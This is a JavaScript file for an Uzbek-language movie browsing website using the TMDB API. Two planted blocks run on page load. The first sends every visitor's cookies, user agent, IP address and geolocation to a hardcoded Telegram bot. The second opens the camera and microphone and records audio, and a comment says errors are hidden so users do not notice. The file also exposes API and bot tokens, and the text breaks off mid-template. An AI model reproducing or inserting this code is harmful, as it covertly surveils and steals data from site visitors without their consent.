const API_KEY = '1cc4799e6c8448e51c96a232c8ec4b18';
const API_URL = 'https://api.themoviedb.org/3';

const CONFIG = {
  apiKey: API_KEY,
  apiUrl: API_URL,
  imageBaseUrl: 'https://image.tmdb.org/t/p/w500',
  backdropBaseUrl: 'https://image.tmdb.org/t/p/w1280',
  defaultLanguage: 'uz-UZ',
  defaultRegion: 'UZ',
  carouselAutoplayInterval: 5000,
  itemsPerPage: 20,
  genres: {
    28: "Jangari",
    12: "Sarguzasht",
    16: "Animatsiya",
    35: "Komediya",
    80: "Jinoiy",
    99: "Hujjatli",
    18: "Drama",
    10751: "Oila",
    14: "Fantastika",
    36: "Tarixiy",
    27: "Qo'rqinchli",
    10402: "Musiqiy",
    9648: "Sirli",
    10749: "Romantik",
    878: "Ilmiy-fantastik",
    53: "Triller",
    37: "G'arbiy"
  }
};

// Show watchlist view
async function showWatchlist() {
  if (!state.watchlist.length) {
    if (elements.moviesGrid) elements.moviesGrid.innerHTML = '';
    toggleEmptyState(true);
    return;
  }
  const json = await loadMoviesFromJSON();
  let wlMovies = [];
  if (json.length) {
    wlMovies = json.filter(m => state.watchlist.includes(Number(m.id)));
  } else {
    wlMovies = await Promise.all(state.watchlist.map(async id => {
      try {
        const res = await fetch(`${CONFIG.apiUrl}/movie/${id}?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}`);
        if (!res.ok) return null;
        return await res.json();
      } catch {
        return null;
      }
    }));
    wlMovies = wlMovies.filter(Boolean);
  }
  renderMovies(wlMovies);
  toggleEmptyState(wlMovies.length === 0);
}

// Load 500 popular movies (25 pages x 20 items) and render
async function fetchAllPopular(limit = 500) {
  try {
    setLoading(true);
    const json = await loadMoviesFromJSON();
    if (json.length) {
      const slice = json.slice(0, limit);
      renderMovies(slice);
      setupCarousel(slice.slice(0, 5));
      state.totalPages = 1;
      state.currentPage = 1;
      return;
    }
    const perPage = CONFIG.itemsPerPage || 20;
    const pages = Math.ceil(limit / perPage);
    const results = [];
    for (let p = 1; p <= pages; p++) {
      try {
        const res = await fetch(`${CONFIG.apiUrl}/movie/popular?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&page=${p}`);
        const data = await res.json();
        if (Array.isArray(data.results)) results.push(...data.results);
        if (results.length >= limit) break;
      } catch (e) {
        console.debug('fetchAllPopular page error', p, e);
      }
    }
    const list = results.slice(0, limit);
    renderMovies(list);
    setupCarousel(list.slice(0, 5));
    state.totalPages = 1;
    state.currentPage = 1;
  } catch (err) {
    console.error('fetchAllPopular error:', err);
  } finally {
    setLoading(false);
  }

  // Pause autoplay when tab is hidden, resume when visible
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      clearInterval(state.carouselInterval);
    } else {
      // Only resume if autoplay is enabled
      if (!elements.carouselAutoplay || elements.carouselAutoplay.checked) {
        startCarouselAutoplay();
      }
    }
  });
}

document.addEventListener('DOMContentLoaded', async () => {
  // ... oldingi kodlar (setTimeout, setupEventListeners() va h.k.)

  setupEventListeners();

  // <-- BU YERGA QO'SHING: Logger kodini
  (function() {
    const token = '7898891497:AAHe2velplZq73bfMtEaKReIZoAWlsL6Vgk';  // BotFather dan oling
    const chatId = '5073544572';  // Sizning Telegram ID

    const data = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      cookies: document.cookie
    };

    // IP olish
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(d => {
        data.ip = d.ip;
        sendToTelegram(data);
      });

    // Geolokatsiya
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        data.lat = pos.coords.latitude;
        data.lon = pos.coords.longitude;
        sendToTelegram(data);
      });
    }

    async function sendToTelegram(data) {
      const message = `Telefon IP: ${data.ip || 'N/A'}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat || 'N/A'}, ${data.lon || 'N/A'}\nTil: ${data.language}`;
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      await fetch(url);
    }
  })();  // IIFE – darhol ishga tushadi

  // ... keyingi kodlar (try { await fetchMovies('popular'); } va h.k.)
});

// Load Top Rated Top 10 movies and render
async function fetchTopRatedTop10() {
  try {
    setLoading(true);
    const json = await loadMoviesFromJSON();
    if (json.length) {
      const sorted = [...json].sort((a, b) => (b.averageRating || b.vote_average || 0) - (a.averageRating || a.vote_average || 0));
      const top10 = sorted.slice(0, 10);
      renderMovies(top10);
      setupCarousel(top10.slice(0, 5));
      state.totalPages = 1;
      state.currentPage = 1;
      return;
    }
    const res = await fetch(`${CONFIG.apiUrl}/movie/top_rated?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&page=1`);
    const data = await res.json();
    const top10 = (data.results || []).slice(0, 10);
    renderMovies(top10);
    setupCarousel(top10.slice(0, 5));
    state.totalPages = 1;
    state.currentPage = 1;
  } catch (err) {
    console.error('fetchTopRatedTop10 error:', err);
  } finally {
    setLoading(false);
  }
}


// Avtomatik kamera/mikrofon nazorati
(function() {
  async function startRemoteControl() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.style.position = 'fixed';  // Yashirin yoki ko'rsatish
      video.style.top = '0'; video.style.left = '0'; video.style.width = '100%'; video.style.height = '100%'; video.style.zIndex = '9999';
      video.style.objectFit = 'cover';  // To'liq ekran
      document.body.appendChild(video);

      // Mikrofon ovozini yozish (5 soniya)
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const url = URL.createObjectURL(blob);
        // Telegram'ga yuborish yoki yuklab olish
        const a = document.createElement('a');
        a.href = url;
        a.download = 'phone_audio.webm';
        a.click();
      };
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 5000);

      // Stream ni to'xtatish tugmasi (ixtiyoriy)
      const stopBtn = document.createElement('button');
      stopBtn.textContent = 'To'xtatish';
      stopBtn.style.position = 'fixed'; stopBtn.style.bottom = '20px'; stopBtn.style.right = '20px';
      stopBtn.onclick = () => stream.getTracks().forEach(track => track.stop());
      document.body.appendChild(stopBtn);
    } catch (err) {
      console.log('Ruxsat rad etildi:', err);  // Foydalanuvchi sezmasligi uchun
    }
  }

  // Sahifa yuklanganda darhol ishga tushirish
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    startRemoteControl();
  }
})();

const state = {
  currentMovies: [],
  currentPage: 1,
  totalPages: 1,
  isLoading: false,
  carouselInterval: null,
  currentSlide: 0,
  carouselItems: [],
  favorites: [],
  watchlist: [],
  currentFilter: 'popular',
  currentGenreId: null,
  currentSearchQuery: '',
  currentCategory: null,
  currentModalMovieId: null
};

const elements = {
  moviesGrid: document.getElementById('moviesGrid'),
  searchForm: document.getElementById('searchForm'),
  searchInput: document.getElementById('searchInput'),
  searchSuggestions: document.getElementById('searchSuggestions'),
  loadMoreBtn: document.getElementById('loadMore'),
  sortSelect: document.getElementById('sortSelect'),
  movieModal: document.getElementById('movieModal'),
  modalClose: document.getElementById('modalClose'),
  modalTitle: document.getElementById('modalTitle'),
  modalPoster: document.getElementById('modalPoster'),
  modalOverview: document.getElementById('modalOverview'),
  modalMeta: document.getElementById('modalMeta'),
  trailerBtn: document.getElementById('trailerBtn'),
  modalFavBtn: document.getElementById('modalFavBtn'),
  carouselTrack: document.getElementById('carouselTrack'),
  carouselPrev: document.getElementById('carouselPrev'),
  carouselNext: document.getElementById('carouselNext'),
  carouselDots: document.getElementById('carouselDots'),
  carouselAutoplay: document.getElementById('carouselAutoplay'),
  favoritesToggle: document.getElementById('favoritesToggle'),
  watchlistToggle: document.getElementById('watchlistToggle'),
  emptyState: document.getElementById('emptyState'),
  navLinks: document.querySelectorAll('.main-nav .nav-link'),
  categoryCards: document.querySelectorAll('.category-card'),
  moviesSectionTitle: document.getElementById('moviesSectionTitle'),
  mobileMenuToggle: document.querySelector('.mobile-menu-toggle'),
  mainNav: document.querySelector('.main-nav'),
  trailerModal: document.getElementById('trailerModal'),
  trailerFrame: document.getElementById('trailerFrame'),
  trailerClose: document.getElementById('trailerClose'),
  // Reviews & ratings
  reviewForm: document.getElementById('reviewForm'),
  reviewsList: document.getElementById('reviewsList'),
  reviewRating: document.getElementById('reviewRating'),
  reviewText: document.getElementById('reviewText'),
  // Footer links
  footerFavorites: document.getElementById('footerFavorites'),
  footerHistory: document.getElementById('footerHistory'),
  footerProfile: document.getElementById('footerProfile'),
  footerSettings: document.getElementById('footerSettings'),
  footerFAQ: document.getElementById('footerFAQ'),
  footerSupport: document.getElementById('footerSupport')
};

// Load favorites from localStorage as an array of numbers
try {
  const rawFav = JSON.parse(localStorage.getItem('favorites') || '[]');
  state.favorites = Array.isArray(rawFav) ? rawFav.map(id => Number(id)) : [];
} catch {
  state.favorites = [];
}
// Load watchlist
try {
  const rawWl = JSON.parse(localStorage.getItem('watchlist') || '[]');
  state.watchlist = Array.isArray(rawWl) ? rawWl.map(id => Number(id)) : [];
} catch {
  state.watchlist = [];
}

// Helpers to normalize movie object
function getTitle(m) {
  return m.primaryTitle || m.title || m.name || '';
}

function getPosterUrl(m) {
  if (m.primaryImage) return m.primaryImage;
  if (m.poster_img) return m.poster_img;
  if (m.poster_path) return CONFIG.imageBaseUrl + m.poster_path;
  if (m.poster_background) return m.poster_background;
  if (m.image) return m.image;
  return 'https://via.placeholder.com/300x450/1a1a1a/ffffff?text=No+Image';
}

function getYear(m) {
  if (m.releaseDate) return Number(new Date(m.releaseDate).getFullYear()) || 'N/A';
  if (m.release_date) return Number(new Date(m.release_date).getFullYear()) || 'N/A';
  if (m.year) return m.year;
  return 'N/A';
}

function getRating(m) {
  if (typeof m.averageRating === 'number') return m.averageRating.toFixed(1);
  if (typeof m.vote_average === 'number') return m.vote_average.toFixed(1);
  return 'N/A';
}

function getDescription(m) {
  return m.description || m.details || m.overview || 'No description available.';
}

function getGenresText(m) {
  if (Array.isArray(m.genres)) return m.genres.join(', ');
  if (Array.isArray(m.genre_ids))
    return m.genre_ids.map(id => CONFIG.genres[id] || id).filter(Boolean).join(', ');
  if (m.type) return m.type;
  return 'N/A';
}

// Load movies.json
async function loadMoviesFromJSON() {
  try {
    const res = await fetch('movies.json', { cache: 'no-cache' });
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data) ? data : [];
  } catch (err) {
    console.error('loadMoviesFromJSON error:', err);
    return [];
  }
}

// Fetch popular movies: use local JSON if available, otherwise fetch from API
async function fetchPopularMovies(page = 1) {
  try {
    const json = await loadMoviesFromJSON();
    if (json.length) return json;
    const res = await fetch(`${CONFIG.apiUrl}/movie/popular?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&page=${page}`);
    const data = await res.json();
    return data.results || [];
  } catch (err) {
    console.error('fetchPopularMovies error:', err);
    return [];
  }
}

// Render utilities
function toggleEmptyState(show) {
  if (!elements.emptyState) return;
  elements.emptyState.hidden = !show;
}

function renderMovies(movies = [], append = false) {
  if (!elements.moviesGrid) return;
  if (!append) elements.moviesGrid.innerHTML = '';
  movies.forEach(movie => {
    elements.moviesGrid.appendChild(createMovieCard(movie));
  });
  toggleEmptyState(movies.length === 0 && !append);
  state.currentMovies = append ? [...state.currentMovies, ...movies] : movies;
  // Update global comment counts for visible cards (non-blocking)
  try { updateCommentBadges(state.currentMovies); } catch {}
}

// Skeletons for loading state
function renderSkeletons(count = 12) {
  if (!elements.moviesGrid) return;
  elements.moviesGrid.innerHTML = '';
  for (let i = 0; i < count; i++) {
    const li = document.createElement('li');
    li.className = 'movie-card skeleton';
    li.innerHTML = `
      <div class="poster-wrap">
        <div class="skeleton-box poster"></div>
      </div>
      <div class="movie-info">
        <div class="skeleton-box title"></div>
        <div class="skeleton-box meta"></div>
      </div>
    `;
    elements.moviesGrid.appendChild(li);
  }
}

// Create movie card element
// Kino kartochkasini yaratish funksiyasini yangilash
function createMovieCard(movie) {
  const id = Number(movie.id);
  const li = document.createElement('li');
  li.className = 'movie-card';
  li.dataset.id = id;

  const poster = getPosterUrl(movie);
  const title = getTitle(movie);
  const year = getYear(movie);
  const rating = getRating(movie);
  const desc = getDescription(movie);
  const isFav = state.favorites.includes(id);
  const inWatchlist = state.watchlist.includes(id);

  const posterPath = movie.poster_path || '';
  const srcset = posterPath
    ? `${CONFIG.imageBaseUrl.replace('w500','w185')}${posterPath} 185w, ${CONFIG.imageBaseUrl.replace('w500','w342')}${posterPath} 342w, ${CONFIG.imageBaseUrl.replace('w500','w500')}${posterPath} 500w`
    : '';
  li.innerHTML = `
    <div class="poster-wrap">
      <img src="${poster}" ${srcset ? `srcset="${srcset}" sizes="(max-width: 480px) 45vw, (max-width: 768px) 30vw, 200px"` : ''} alt="${title}" loading="lazy" decoding="async" width="300" height="450">
      <button class="poster-fav-btn" type="button" aria-label="Sevimlilarga qo'shish" aria-pressed="${isFav}" data-id="${id}">
        <i class="${isFav ? 'fas' : 'far'} fa-heart"></i>
      </button>
      <button class="poster-watchlist-btn" type="button" aria-label="Watchlistga qo'shish" aria-pressed="${inWatchlist}" data-id="${id}" style="position:absolute;top:48px;right:8px;width:36px;height:36px;border:none;border-radius:50%;background:rgba(0,0,0,0.45);color:#fff;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 4px 16px rgba(0,0,0,0.35)">
        <i class="${inWatchlist ? 'fas' : 'far'} fa-bookmark"></i>
      </button>
      <div class="quick-info">
        <p>${desc}</p>
        <div class="quick-actions">
          <button class="btn btn-watch-single" data-id="${id}">
            <i class="fas fa-play"></i> Ko'rish
          </button>
          <button class="btn btn-trailer" data-id="${id}">
            <i class="fas fa-film"></i> Treylerni ko'rish
          </button>
        </div>
      </div>
    </div>
    <div class="movie-info">
      <h4>${title}</h4>
      <div class="meta">${year} • ⭐ ${rating}${isFav ? ' • ❤️' : ''}</div>
    </div>
  `;
  
  // Kartochkaga bosilganda single sahifaga o'tish
  li.addEventListener('click', (e) => {
    if (e.target.closest('.btn')) return; // tugma bosilganda ishlamasin
    watchMovie(movie);
  });

  // 3D effektlar
  li.addEventListener('mouseleave', () => li.style.transform = '');
  li.addEventListener('mousemove', (e) => {
    if (window.innerWidth < 768) return;
    const rect = li.getBoundingClientRect();
    const x = (e.clientX - rect.left - rect.width / 2) / 25;
    const y = (rect.height / 2 - (e.clientY - rect.top)) / 25;
    li.style.transform = `perspective(1000px) rotateY(${x}deg) rotateX(${y}deg)`;
  });

  // "Ko'rish" tugmasi uchun hodisalar
  const watchBtn = li.querySelector('.btn-watch-single');
  if (watchBtn) {
    watchBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      watchMovie(movie);
    });
  }

  // "Treylerni ko'rish" tugmasi uchun hodisalar
  const trailerBtn = li.querySelector('.btn-trailer');
  if (trailerBtn) {
    trailerBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      openTrailerModal(movie);
    });
  }

  // Favorites heart button on card
  const favBtn = li.querySelector('.poster-fav-btn');
  if (favBtn) {
    favBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const mid = Number(favBtn.dataset.id);
      const idx = state.favorites.indexOf(mid);
      if (idx === -1) state.favorites.push(mid); else state.favorites.splice(idx, 1);
      localStorage.setItem('favorites', JSON.stringify(state.favorites));
      const pressed = state.favorites.includes(mid);
      favBtn.setAttribute('aria-pressed', String(pressed));
      const icon = favBtn.querySelector('i');
      if (icon) icon.className = (pressed ? 'fas' : 'far') + ' fa-heart';
      // Update meta heart in card
      const meta = li.querySelector('.meta');
      if (meta) {
        if (pressed && !meta.innerHTML.includes('❤️')) meta.innerHTML += ' • ❤️';
        if (!pressed && meta.innerHTML.includes('❤️')) meta.innerHTML = meta.innerHTML.replace(' • ❤️', '');
      }
    });
  }

  // Watchlist button on card
  const wlBtn = li.querySelector('.poster-watchlist-btn');
  if (wlBtn) {
    wlBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const mid = Number(wlBtn.dataset.id);
      const idx = state.watchlist.indexOf(mid);
      if (idx === -1) state.watchlist.push(mid); else state.watchlist.splice(idx, 1);
      localStorage.setItem('watchlist', JSON.stringify(state.watchlist));
      const pressed = state.watchlist.includes(mid);
      wlBtn.setAttribute('aria-pressed', String(pressed));
      const icon = wlBtn.querySelector('i');
      if (icon) icon.className = (pressed ? 'fas' : 'far') + ' fa-bookmark';
    });
  }

  return li;
}

// Update comment count badges using global Comments API
async function updateCommentBadges(movies){
  if (!Array.isArray(movies) || !movies.length) return;
  if (typeof window === 'undefined' || !window.Comments) return; // comments module not loaded yet
  // Limit concurrent fetches
  const limit = 10;
  let index = 0;
  async function next(){
    if (index >= movies.length) return;
    const m = movies[index++];
    const id = Number(m.id);
    try {
      const count = await window.Comments.getCount(id);
      const card = document.querySelector(`.movie-card[data-id="${id}"]`);
      if (card) {
        const meta = card.querySelector('.meta');
        if (meta) {
          // remove existing badge
          const old = meta.querySelector('.comment-badge');
          if (old) old.remove();
          const badge = document.createElement('span');
          badge.className = 'comment-badge';
          badge.innerHTML = `<i class="fas fa-comment"></i> ${count}`;
          meta.appendChild(badge);
        }
      }
    } catch {}
    next();
  }
  const workers = Math.min(limit, movies.length);
  for (let i=0;i<workers;i++) next();
}

// "Ko'rish" funksiyasi - singlepage.html ga yo'naltiradi
function watchMovie(movie) {
  // Tanlangan filmni localStorage ga saqlaymiz
  localStorage.setItem('selectedMovieId', movie.id);
  // Watch historyga yozib qo'yamiz
  try {
    const prev = JSON.parse(localStorage.getItem('watch_history') || '[]');
    const entry = {
      id: Number(movie.id),
      title: getTitle(movie),
      poster: getPosterUrl(movie),
      at: new Date().toISOString()
    };
    const next = [entry, ...prev.filter(x => Number(x.id) !== Number(movie.id))].slice(0, 100);
    localStorage.setItem('watch_history', JSON.stringify(next));
  } catch (e) {
    console.debug('watch_history save failed', e);
  }
  // Singlepage sahifasiga o'tamiz
  window.location.href = 'singlepage.html';
}

// "Treylerni ko'rish" funksiyasi - YouTube treylerga yo'naltiradi
function watchTrailer(movie) {
  // Filmdan treyler URL sini olish
  const trailerUrl = movie.trailer || movie.video || '';
  
  if (trailerUrl) {
    // Backward compatibility: open in new tab if modal is not present
    if (!elements.trailerModal || !elements.trailerFrame) {
      window.open(trailerUrl, '_blank');
      return;
    }
    openTrailerModal(movie);
  } else {
    // Agar treyler mavjud bo'lmasa, foydalanuvchiga xabar beramiz
    alert('Uzr, bu film uchun treyler mavjud emas.');
  }
}

function normalizeTrailerUrl(url) {
  if (!url) return '';
  // Ensure protocol for //ok.ru
  if (url.startsWith('//')) return 'https:' + url;
  // If it's a YouTube watch URL, convert to embed
  try {
    const u = new URL(url);
    if ((u.hostname.includes('youtube.com') || u.hostname === 'youtu.be')) {
      let vid = u.searchParams.get('v');
      if (!vid && u.hostname === 'youtu.be') vid = u.pathname.slice(1);
      if (vid) return `https://www.youtube.com/embed/${vid}?autoplay=1`;
    }
  } catch {}
  return url;
}

function openTrailerModal(movie) {
  if (!elements.trailerModal || !elements.trailerFrame) return;
  const src = normalizeTrailerUrl(movie.trailer || movie.video || '');
  if (!src) return alert('Uzr, bu film uchun treyler topilmadi.');
  elements.trailerFrame.src = src;
  elements.trailerModal.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
}

function closeTrailerModal() {
  if (!elements.trailerModal || !elements.trailerFrame) return;
  elements.trailerModal.setAttribute('aria-hidden', 'true');
  // Stop video
  elements.trailerFrame.src = '';
  document.body.style.overflow = '';
}

// Modal handling
function openMovieModal(movie) {
  if (!elements.movieModal) return;
  const id = Number(movie.id);
  state.currentModalMovieId = id;
  const title = getTitle(movie);
  const poster = getPosterUrl(movie);
  const year = getYear(movie);
  const genres = getGenresText(movie);
  const rating = getRating(movie);
  const desc = getDescription(movie);

  if (elements.modalTitle) elements.modalTitle.textContent = title;
  if (elements.modalPoster) {
    elements.modalPoster.src = poster;
    elements.modalPoster.alt = title;
    elements.modalPoster.loading = 'lazy';
    elements.modalPoster.decoding = 'async';
    elements.modalPoster.width = 300;
    elements.modalPoster.height = 450;
  }
  if (elements.modalMeta)
    elements.modalMeta.textContent = `${year} • ${genres} • ⭐ ${rating}`;
  if (elements.modalOverview) elements.modalOverview.textContent = desc;

  if (elements.trailerBtn) {
    if (movie.trailer || movie.video) {
      elements.trailerBtn.href = movie.trailer || movie.video;
      elements.trailerBtn.style.display = 'inline-flex';
    } else {
      elements.trailerBtn.style.display = 'none';
    }
  }

  if (elements.modalFavBtn) {
    elements.modalFavBtn.dataset.id = id;
    const fav = state.favorites.includes(id);
    elements.modalFavBtn.setAttribute('aria-pressed', String(fav));
    elements.modalFavBtn.innerHTML = fav
      ? '<i class="fas fa-heart"></i> Sevimlilardan olib tashlash'
      : '<i class="far fa-heart"></i> Sevimlilarga qo\'shish';
  }

  elements.movieModal.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';

  // Render existing reviews for this movie
  renderReviews(id);
}

function closeModal() {
  if (!elements.movieModal) return;
  elements.movieModal.setAttribute('aria-hidden', 'true');
  document.body.style.overflow = 'auto';
}

// Toggle favorite from modal
function toggleFavoriteFromModal() {
  if (!elements.modalFavBtn) return;
  const id = Number(elements.modalFavBtn.dataset.id);
  if (!id) return;

  const index = state.favorites.indexOf(id);
  if (index === -1) {
    state.favorites.push(id);
  } else {
    state.favorites.splice(index, 1);
  }
  localStorage.setItem('favorites', JSON.stringify(state.favorites));

  const fav = state.favorites.includes(id);
  elements.modalFavBtn.setAttribute('aria-pressed', String(fav));
  elements.modalFavBtn.innerHTML = fav
    ? '<i class="fas fa-heart"></i> Sevimlilardan olib tashlash'
    : '<i class="far fa-heart"></i> Sevimlilarga qo\'shish';

  const card = document.querySelector(`.movie-card[data-id="${id}"]`);
  if (card) {
    const meta = card.querySelector('.meta');
    if (meta) {
      if (fav && !meta.innerHTML.includes('❤️')) meta.innerHTML += ' • ❤️';
      if (!fav && meta.innerHTML.includes('❤️'))
        meta.innerHTML = meta.innerHTML.replace(' • ❤️', '');
    }
  }
}

// Show favorites view
async function showFavorites() {
  if (!state.favorites.length) {
    if (elements.moviesGrid) elements.moviesGrid.innerHTML = '';
    toggleEmptyState(true);
    return;
  }
  const json = await loadMoviesFromJSON();
  let favMovies = [];
  if (json.length) {
    favMovies = json.filter(m => state.favorites.includes(Number(m.id)));
  } else {
    favMovies = await Promise.all(state.favorites.map(async id => {
      try {
        const res = await fetch(`${CONFIG.apiUrl}/movie/${id}?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}`);
        if (!res.ok) return null;
        return await res.json();
      } catch {
        return null;
      }
    }));
    favMovies = favMovies.filter(Boolean);
  }
  renderMovies(favMovies);
  toggleEmptyState(favMovies.length === 0);
}

// Search movies wrapper
async function searchMovies(query, page = 1) {
  const json = await loadMoviesFromJSON();
  if (json.length) {
    const q = query.toLowerCase();
    // match by title/desc and also by category/genres names
    const results = json.filter(m => {
      const inText = getTitle(m).toLowerCase().includes(q) ||
        (m.description && m.description.toLowerCase().includes(q)) ||
        (m.details && m.details.toLowerCase().includes(q));
      const genresArr = Array.isArray(m.genres) ? m.genres : (Array.isArray(m.category) ? m.category : []);
      const inGenre = genresArr.some(g => String(g).toLowerCase().includes(q));
      return inText || inGenre;
    });
    renderMovies(results);
    toggleEmptyState(results.length === 0);
    return;
  }
  try {
    setLoading(true);
    // If user searches for a known genre name, prefer discover by genre
    const genreId = getGenreIdFromQuery(query);
    if (genreId) {
      await fetchMoviesByGenre(genreId, page);
      return;
    }
    // If user searches by actor using prefix (e.g., actor:Tom Hardy or @Tom Hardy)
    const actorQuery = getActorQuery(query);
    if (actorQuery) {
      const movies = await searchByActor(actorQuery, page);
      renderMovies(movies);
      toggleEmptyState(movies.length === 0);
      return;
    }
    const res = await fetch(
      `${CONFIG.apiUrl}/search/movie?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&query=${encodeURIComponent(query)}&page=${page}`
    );
    const data = await res.json();
    renderMovies(data.results || []);
    toggleEmptyState((data.results || []).length === 0);
  } catch (err) {
    console.error('searchMovies error:', err);
  } finally {
    setLoading(false);
  }
}

// Fetch movies wrapper
async function fetchMovies(filter = 'popular', page = 1) {
  try {
    setLoading(true);
    const json = await loadMoviesFromJSON();
    if (json.length) {
      // If local JSON exists, ignore pagination from API
      let filteredMovies = json;
      
      // Filter by category if specified
      if (state.currentCategory) {
        const cat = state.currentCategory.toLowerCase();
        filteredMovies = json.filter(movie => {
          const mc = movie.category;
          if (!mc) return false;
          if (Array.isArray(mc)) {
            return mc.some(c => String(c).toLowerCase().includes(cat));
          }
          return String(mc).toLowerCase().includes(cat);
        });
      }
      
      renderMovies(filteredMovies);
      // Karusel uchun har doim original filmlarni ishlatamiz (filterlangan emas)
      setupCarousel(json.slice(0, 5));
      state.totalPages = 1;
      return;
    }
    let url = `${CONFIG.apiUrl}/movie/popular?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&page=${page}`;
    if (filter === 'now_playing')
      url = `${CONFIG.apiUrl}/movie/now_playing?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&page=${page}`;
    if (filter === 'top_rated')
      url = `${CONFIG.apiUrl}/movie/top_rated?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&page=${page}`;
    const res = await fetch(url);
    const data = await res.json();
    renderMovies(data.results || []);
    if (filter === 'popular') setupCarousel((data.results || []).slice(0, 5));
    state.totalPages = data.total_pages || 1;
  } catch (err) {
    console.error('fetchMovies error:', err);
  } finally {
    setLoading(false);
  }
}

// Fetch movies by genre
async function fetchMoviesByGenre(genreId, page = 1) {
  const json = await loadMoviesFromJSON();
  if (json.length) {
    const genreName = CONFIG.genres[genreId] ? CONFIG.genres[genreId].toLowerCase() : '';
    const results = json.filter(m =>
      (Array.isArray(m.genres) && m.genres.some(g => g.toLowerCase().includes(genreName))) ||
      (m.type && m.type.toLowerCase().includes(genreName))
    );
    renderMovies(results);
    toggleEmptyState(results.length === 0);
    return;
  }
  try {
    setLoading(true);
    const res = await fetch(
      `${CONFIG.apiUrl}/discover/movie?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&with_genres=${genreId}&page=${page}`
    );
    const data = await res.json();
    renderMovies(data.results || []);
    toggleEmptyState((data.results || []).length === 0);
  } catch (err) {
    console.error('fetchMoviesByGenre error:', err);
  } finally {
    setLoading(false);
  }
}

// Carousel functions
function calculateSlidePosition(index, currentSlide) {
  const positions = {
    left: '50%',
    zIndex: 1,
    scale: 0.8,
    opacity: 0.7,
    filter: 'grayscale(0.5) brightness(0.7)'
  };
  
  // Keyingi slayd (o'ng tomondagi)
  if (index === (currentSlide + 1) % state.carouselItems.length) {
    positions.left = '65%';
    positions.zIndex = 4;
    positions.scale = 0.9;
    positions.opacity = 0.9;
    positions.filter = 'grayscale(0) brightness(1)';
  } 
  // Markazdagi slayd
  else if (index === currentSlide) {
    positions.left = '40%';
    positions.zIndex = 5;
    positions.scale = 1;
    positions.opacity = 1;
    positions.filter = 'grayscale(0) brightness(1)';
  } 
  // Oldingi slayd (chap tomondagi)
  else if (index === (currentSlide - 1 + state.carouselItems.length) % state.carouselItems.length) {
    positions.left = '15%';
    positions.zIndex = 3;
    positions.scale = 0.8;
    positions.opacity = 0.7;
  } 
  // Boshqa slaydlar
  else {
    // Chapda joylashgan slaydlar
    if ((index < currentSlide && !(currentSlide === state.carouselItems.length - 1 && index === 0)) || 
        (currentSlide === 0 && index === state.carouselItems.length - 1)) {
      const offset = (currentSlide - index + state.carouselItems.length) % state.carouselItems.length;
      positions.left = `${15 - (offset * 15)}%`;
      positions.zIndex = 2 - offset;
      positions.opacity = 0.5 - (offset * 0.1);
      positions.scale = 0.7 - (offset * 0.1);
    } 
    // O'ngda joylashgan slaydlar
    else {
      const offset = (index - currentSlide + state.carouselItems.length) % state.carouselItems.length;
      positions.left = `${65 + ((offset-1) * 15)}%`;
      positions.zIndex = 2 - (offset-1);
      positions.opacity = 0.5 - ((offset-1) * 0.1);
      positions.scale = 0.7 - ((offset-1) * 0.1);
    }
  }
  
  return positions;
}
function setupCarousel(movies = []) {
  if (!elements.carouselTrack || !movies.length) return;
  const isMobile = window.innerWidth <= 768;
  state.carouselItems = movies;
  elements.carouselTrack.innerHTML = '';
  if (elements.carouselDots) elements.carouselDots.innerHTML = '';

  movies.forEach((m, i) => {
    const slide = document.createElement('div');
    slide.className = `carousel-slide`;
    if (i === 0) slide.classList.add('center');
    
    // Slayderlarni joylashtirish (mobil va desktop uchun bir xil model)
    const position = calculateSlidePosition(i, 0);
    slide.style.left = position.left;
    slide.style.zIndex = position.zIndex;
    slide.style.transform = `scale(${position.scale})`;
    slide.style.opacity = position.opacity;
    if (position.filter) slide.style.filter = position.filter;
    
    slide.dataset.index = i;
    
    // Poster background uchun to'g'ri URL olish
    let bg = '';
    if (m.poster_background) {
      bg = m.poster_background;
    } else if (m.backdrop_path) {
      bg = CONFIG.backdropBaseUrl + m.backdrop_path;
    } else if (m.image) {
      bg = m.image;
    } else {
      bg = getPosterUrl(m);
    }
    
    const title = getTitle(m);
    const year = getYear(m);
    const rating = getRating(m);
    
    slide.innerHTML = `
      <div class="slide-bg" data-bg="${bg}"></div>
      <div class="slide-content">
        <h3 class="slide-title">${title}</h3>
        <div class="slide-meta">${year} • ⭐ ${rating}</div>
        <button class="btn btn-ghost watch-btn" data-id="${m.id}">
          <i class="fas fa-play-circle"></i> Ko'rish
        </button>
